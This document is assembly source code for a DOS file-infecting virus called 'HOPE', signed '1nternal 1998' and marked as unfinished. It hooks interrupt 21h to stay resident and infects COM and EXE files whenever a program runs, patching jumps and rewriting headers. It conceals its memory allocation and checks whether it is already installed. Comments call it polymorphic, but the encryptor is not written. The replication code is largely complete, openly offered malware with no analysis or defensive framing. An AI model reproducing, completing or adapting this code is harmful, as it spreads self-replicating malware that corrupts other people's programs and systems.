;HOPE Polymorphic. EXE/COM. Resident DOS Exec Hooking
;Appends /? to command line occasionally

;!!!!
;!!!! INCOMPLETE/UNFINISHED !!!!!!!
;!!!!

VSIZE Equ 02E      ;in paragraphs
VBYTESIZE Equ 02DA ;in bytes
BUFFER Equ 040 ; in paragraphs

    org 0

MAIN:

Paligned:		;Will be aligned to a para by [HOPE]
Jmp Running
;----------------------------------------------------------------------------
   
   
   ;Tables for storage:
   Filehandle:
   INT 021		;Int 021 for this generation only
   Originalss:
   dw ?			;The original SS from EXE Header
   Originalsp:
   dw 0FFFE             ;The original SP from EXE header/or FFFE
   Originales:
   dw ?			;The ES register when program started
   Prevstackss:
   dw ?			;Segment of DOS stack
   Prevstacksp:
   dw ?			;Offset of DOS stack
   Flag:
   db 1                 ;Flag of whether in COM or EXE
   
   Savedbytes:
   db 0B8,000,04c       ;3 bytes saved when COM infected (MOV AX,04c00)

;---------------------------------------------------------------------------
Int21hook:
   ;INT 21 Payloads here
   PUSHF
   
   Cmp AX,03000h   	;DOS Version Number
   Jne Testexec
   Cmp BX,0DEADh	;If so, we are asking if we're installed
   Jne Keepgoing
   MOV AX,0666           ;Mark it as installed
   POPF
   Iret			;And go back
  Testexec:

   Cmp AX,04B00h  ;DOS Exec
   Je Infect
   
  Keepgoing:
   POPF
   db 0EA
  Old21off:
   dw ?
  Old21seg:
   dw ?

   
;----------------------------------------------------------------------------

Infect:
   ;Running in memory, called when IN21 func 4B
   ;So should save everything
   ;assume an executable
   Push AX     ;To DOS stack
   Push CX
   Push BX
   Push DX
   Push SI
   Push DI
   Push DS
   Push ES
   PUSH BP
  
  ;Uncomment to infect in Win95 
  ;Get actual filename if AL=05
  ;CMP AX,4b05h
  ;JNE NormalEXEC

  ;MOV BX,DX
  ;MOV DX,[BX+4]  ; From execution state structure table
  ;MOV DS,[BX+6]

  ;-------------------------------------------
NormalEXEC:
   
   Cli
   CS Mov [Offset Prevstackss],SS
   CS Mov [Offset Prevstacksp],SP ;Save old stack
   Sti

   Mov AX,04800
   Mov BX,BUFFER	;Allocate our own stack/buffer (0300 bytes)
   Int 021
   Cli
   Mov SS,AX	        ;Set our new stack
   Mov SP,(BUFFER * 010)	;Set the SP of the stack seg
   Sti

  ;---------------------------------------------
   ;Check extension if COM or EXE, otherwise abort
   ;Check if target file (DEBUG)
   MOV SI,DX
   
   CLD
  NOZERO: 
   LODSB	;Go to the end of the file+path string
   CMP Al,'.'	;Found the dot
   JE CHKEXT
   OR AL,AL
   JNZ NOZERO

   JMP None
   
  CHKEXT:
   
   ;!!!!!! DEBUG !!!!!!
   ;CMP w[SI-3],'XV'
   ;JNE None       	;Only infect files ending in VX   
   

   ;Test file for EXE or COM, otherwise abort!
   MOV AX,w[SI]
   AND AX,0DFDF
   CMP AX,'OC'
   JNE TRYEXE
   CS Mov B[Offset Flag],1 ;Set flag of COM
   JMP NoAbort   
  TRYEXE: 
   CMP AX,'XE'
   JNE None
   CS Mov B[Offset Flag],0 ;Set flag of EXE
   JMP NoAbort   
  None:
   JMP AbortNoAttribs
  NoAbort:

   Mov AX,04300
   Int 021   	;Get file attribs
   Push CX   	;*****	Attribs
   Mov AX,04301
   Xor CX,CX
   Int 021	;Set file attribs to normal

   Push DS	;*****	ASCII String   
   Push DX	;*****	ASCII String
   
   ;---------------------------------------------
   
   Mov AX,03D02	;Open File (assume a free DTA)
   Int 021
   JNC Openedit
   JMP AbortNoClose
  OPenedit: 
   CS Mov [Offset Filehandle],AX	;Save handle

   ;---------------------------------------------
   
   ;Read in first 32 bytes used for checking infection marker
   Push SS
   Pop DS
   Mov BX,AX
   Call SeekStart
   Xor DX,DX
   Mov CX,020		;Read in header (even if a COM)
   Call ReadBytes
   MOV DX,[0]
   PUSH CS
   POP ES   		;Make ES=CS

   CS Test b[Flag],1
   JZ EXEfile            ;Parse to correct 'infector'

   ;------------------------ COM -------------------------------------------
   ;Save first 3 bytes and modify to JMP if COM
  Comfile:
   Cmp DL,0E9		;COM infection marker of a 'jmp'
   Je Abortit
   CS Mov B[Offset Flag],1 ;Set flag of COM
   XOR SI,SI
   MOV DI,(OFFSET SavedBytes)
   MOVSW
   MOVSB	;Save the 3 bytes
   Call SeekEnd	;In a COM file it should never be bigger than 65535 (1 word)
   OR DX,DX     ;Just in case, DX should always be 0 in a COM
   JNZ Abortit
   CMP AX,(0FF-(VBYTESIZE)) ;Check if too big
   JL Abortit
   
   SUB AX,03    ;Find offset from JMP (size of JMP)
   MOV b[0],0E9	;Copy jmp to Data buffer
   MOV [1],AX	;Copy offset for jmp to data buffer
   Call SeekStart
   MOV CX,3	;Write the JMP to the COM
   Call WriteBytes  ;DX = 0, DS = Read/Write Buffer
   CS MOV w[OFFSET ReturnOff],0100 ;Com files return at offset 0100
   CS MOV w[OFFSET ReturnSeg],0  ;Com files return at offset 0100
   CS MOV w[OFFSET OriginalSS],0 ;Com's use CS=SS
   CS MOV w[OFFSET OriginalSP],0FFFE ;Coms use SP=FFFE
   Call WriteProg
   Jmp DoneFix   
   
  Abortit:
   JMP Abort
   
   ;------------------------ EXE -------------------------------------------
   ;Modify Header if EXE, determine Entry point, modify self for infection
   ;Make sure isn't a Windows NE/PE Header
  Exefile:
   Cmp DX,'ZM'		;Exe marker of 'MZ'
   Jne Abortit		;If not MZ then probably the marker of 'ZM'
   Cmp w[018],040
   JE Abortit		;Windows header
   
   Call CalcLength
   
   cmp [04],ax
   jne Abortit		;Test for internal overlays
   cmp [02],dx
   jne abortit
   cmp w[0C],0
   je Abortit		;High memory allocation
   cmp w[01A],0
   jne abortit		;Check if an overlay
   
   MOV DX,[0E]
   CS MOV [Offset ORIGINALSS],DX  ;Save header values
   MOV DX,[010]
   CS MOV [Offset ORIGINALSP],DX  ;Save header values
   MOV DX,[014]
   CS MOV [Offset ReturnOff],DX  ;Save header values
   MOV DX,[016]
   CS MOV [Offset ReturnSeg],DX   ;Save header values
   
   Call SeekEnd		;Get Length of file

   mov cx,010		;Calculate new CS:IP
   div cx		;Some more code taken from coffeshop
   sub ax,[08]		;AX=CS, DX=IP
   
   MOV w[0],'MZ'	;Mark as infected
   MOV [0E],AX		;Write header values,SS
   MOV w[010], OFFSET StackOFF+030 ;Write header values,SP 
   MOV [014],DX		;Write header values,IP
   MOV [016],AX    	;Write header values,CS
  
   PUSH DS
   Call WriteProg   
   POP DS
   
   Call CalcLength
   
   mov [04],AX       	;write new file size into header
   mov [02],DX

   Call SeekStart
   Mov CX,020
   Call WriteBytes     ;And write the new header
   
   ;-----------------------------------------------------------------------
 
 DoneFix:
   
 Abort:
   CS Mov BX,[Offset Filehandle]	;Restore file handle
   Mov AX,03E00
   Int 021		;Close file handle

 AbortNoClose:
 
  Restattrib:

   Pop DX	;*****	ASCII String
   Pop DS	;*****	ASCII String
   Pop CX	;*****	Attribs
   Mov AX,04301
   Int 021	;Set file attribs back

 AbortNoAttribs:

  Restregs:

   ;Free Stack/Buffer
   Push SS
   Pop ES
   Cli
   CS Mov SS,[Offset Prevstackss]	;Reset old stack
   CS Mov SP,[Offset Prevstacksp]
   Sti
   Mov AX,04900
   Int 021 	;Free our stack/buffer in ES

   Pop BP
   Pop ES
   Pop DS
   Pop DI
   Pop SI
   Pop DX
   Pop BX	;Restore registers from DOS stack
   Pop CX
   Pop AX

   Jmp Keepgoing	;And keep stepping through the int chain as though
   			;nothing has happened
;----------------------------------------------------------------------------
;General Use Functions

CalcLength:
   Call SeekEnd
   mov cx,0200		;Some of this code is from coffeshop
   div cx
   or dx,dx
   jz no_inc		;Test for internal overlays
   inc ax
  no_inc:
   REt
   
SeekStart:
   MOV AX,04200
  ZeroSearch: 
   XOR CX,CX
   CWD
  INTRET:
   INT 021		;Seek to start of file
   RET


SeekEnd:
   MOV AX,04202
   JMP ZeroSearch Short


ReadBytes:
   MOV AX,03F00
   JMP INTRET Short


WriteBytes:
   MOV AX,04000
   JMP INTRET Short


;---------------------------------------------------------------------------
;Allocates memory for the decryptor
;Generates a decryptor, encrypts the virus and appends it to the end of
;the file using the file handle, and frees the allocated memory.

Writeprog:
   ;Reset Data Segment
   Push CS
   Pop DS
   MOV BX,[Offset FileHandle]
   Call SeekEnd
   XOR DX,DX
   Mov CX,VBYTESIZE     ;Code Size
   Call WriteBytes  						 
   Ret

;----------------------------------------------------------------------------

Running:       	;When executing from file
   Call	Ahead short
  Ahead:
   Pop BP	;Find what segment we are in, offset is 0
  Figure:
   Sub BP,(Offset Figure-1)
   PUSH AX
   PUSH BX
   PUSH CX
   PUSH DX	;Save regs
   PUSH DI
   PUSH SI   
   PUSH DS


   Push CS
   Pop DS	;DS has probably been set to CS anyway


   
;----------------------------------------------------------------------------

  Checkinstall:
   Mov AX,03000
   Mov BX,0DEAD
   Int 021
   CMP AX,0666
   Jz Installed

;----------------------------------------------------------------------------

  Install:	;Install into memory
    
   TryResize: 
    MOV AX,ES
    DEC AX
    MOV ES,AX	;Load seg of current MCB
    
    ES CMP b[0],'Z'
    JE LastBlock	;Check if last block in chain

  NormalAlloc:
  
    MOV AX, 04800 ;Allocate memory
    MOV BX, VSIZE    
    INT 021 	  ;AX = seg of allocated block
    JC Installed
    JMP LoadIn

  LastBlock:
    ES MOV BX,w[3]	;Get size of Block
    SUB BX,VSIZE+1	;New size of block :)
    
    INC AX
    MOV ES,AX
    MOV AX,04A00	;Reduce size of current block
    INT 021
    JC Installed

    MOV AX, 04800 ;Allocate memory
    MOV BX, VSIZE    
    INT 021 	  ;AX = seg of allocated block

   LoadIn:

    DEC AX		;Move to MCB
    MOV ES,AX
    ES MOV w[1],08	;Modify owner PSP, 08 = SYSTEM
    INC AX   
    MOV ES,AX		;Get into our memory block made just for us.

  ReadVector:

    PUSH ES
    MOV AX,03521	;Get interrupt 21 Vector
    INT 021
    Mov w[BP+Offset Old21Seg],ES
    Mov w[BP+Offset Old21Off],BX
    POP ES
  
    MOV SI,BP
    XOR DI,DI
    Mov CX,(VBYTESIZE/2)
  CopyLoop: 		;Copy virus into memory
    REP MOVSW
  
  ChangeVector:
    Xor AX,AX
    MOV DS,AX
    cli
    MOV w[(021*4)],Offset Int21Hook	;Set Vector (the sucks way)
    MOV w[(021*4)+2],ES
    sti

;----------------------------------------------------------------------------
  Installed:
    ;Just return
    PUSH CS
    POP DS

    POP DX
    MOV ES,DX

    TEST B[BP+offset Flag],1
    JZ	Notcom    		;Flag = 1 if COM file
    Mov SI,(offset Savedbytes)
    Add SI,BP
    Mov DI,0100
    Movsw			;From DS:SI to ES:DI
    Movsb			;Replace 3 bytes
    Sub DX,010			;Stay within the PSP segment for COMs
   Notcom:
    Add Dx,010			;Get over the PSP segments
    
    ADD w[BP+offset Returnseg],DX ;Calculate new CS   
    ADD w[BP+offset Originalss],DX

    PUSH ES
    POP DS
    
    POP SI    
    POP DI
    POP DX	;Restore regs
    POP CX
    POP BX    
    POP AX
    
    Cli
    CS Mov SS,[BP+Originalss]
    CS Mov SP,[BP+Originalsp]
    Sti

    db 0EA		;Far Jump
   Returnoff:
    dw 0                ;0100 if COM file, else IP in EXE header
   Returnseg:
    dw 010              ;0 if COM file

    db '1nternal 1998' 

   StackOFF:
END MAIN
